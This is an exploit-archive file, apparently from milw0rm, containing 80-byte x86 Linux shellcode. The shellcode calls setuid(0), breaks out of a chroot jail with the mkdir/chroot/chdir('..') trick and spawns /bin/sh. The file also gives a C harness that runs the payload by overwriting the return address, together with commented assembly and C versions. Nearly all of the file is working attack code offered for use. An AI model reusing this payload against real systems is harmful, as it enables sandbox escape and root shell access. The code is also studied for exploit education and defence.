/* This is Linux chroot()/execve() code.It is 80 bytes long.I have some    *
 * ideas how to make it smaller, but till then use this one.               *
 *                                         signed predator                 *
 *                                         linux registered user : 181116  *
 *                                         preedator(at)sendmail(dot)ru    *
 ***************************************************************************/

char sc[]="\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\xeb\x36\x5e\x88\x46\x0a"
          "\x8d\x5e\x05\xb1\xed\xb0\x27\xcd\x80\x31\xc0\xb0\x3d\xcd\x80\x83"
          "\xc3\x02\xb0\x0c\xcd\x80\xe0\xfa\xb0\x3d\xcd\x80\x89\x76\x08\x31"
          "\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x89\xc2\xb0\x0b"
          "\xcd\x80\xe8\xc5\xff\xff\xff/bin/sh..";

int main(){
  int *ret=(int *)(&ret+2);
  printf("len : %d\n",strlen(sc));
  *ret=(int)sc;
}


// Asm code
/*********************************************
 *int main(){                                *
 * __asm__(" xorl %eax,%eax           \n"    *
 *	   " xorl %ebx,%ebx           \n"    *
 *         " xorl %ecx,%ecx           \n"    *
 *	   " movb $0x17,%al           \n"    *
 *	   " int  $0x80               \n"    *
 *         " jmp 0x36                 \n"    *
 *         " popl %esi                \n"    *
 *	   " movb %al,0xa(%esi)       \n"    *
 *         " leal 0x5(%esi),%ebx      \n"    *
 *	   " movb $0xed,%cl           \n"    *
 *	   " movb $0x27,%al           \n"    *
 *	   " int $0x80                \n"    *
 *         " xorl %eax,%eax           \n"    *
 *         " movb $0x3d,%al           \n"    *
 *	   " int $0x80                \n"    *
 *	   " addl $0x2,%ebx           \n"    *
 *         " movb $0xc,%al            \n"    *
 *	   " int $0x80                \n"    *
 *         " loopne -0x06             \n"    *
 *         " movb $0x3d,%al           \n"    *
 *	   " int $0x80                \n"    *
 *	   " movl %esi,0x8(%esi)      \n"    *
 *         " xorl %eax,%eax           \n"    *
 *         " movb %al,0x7(%esi)       \n"    *
 *         " movl %eax,0xc(%esi)      \n"    *
 *         " movl %esi,%ebx           \n"    *
 *         " leal 0x8(%esi),%ecx      \n"    *
 *         " movl %eax,%edx           \n"    *
 *         " movb $0xb,%al            \n"    *
 *         " int $0x80                \n"    *
 *         " call -0x3b               \n"    *
 *         " .string \"/bin/sh..\"    \n");  *
 *}                                          *
 *********************************************/

//C code
/**********************************************
*int main(){                                  *
*  char *sh[2]={"/bin/sh",NULL};              *
*  int gg=0xed                                *
*  mkdir("sh..",gg);			      *
*  chroot("sh..");			      *
*  while (gg!=0){                             *
*     chdir("..");gg--;                       *
*  }                                          *
* chroot("..");                               *
* execve(sh[0],sh,NULL);                      *
*}                                            *
***********************************************/

// milw0rm.com [2004-09-12]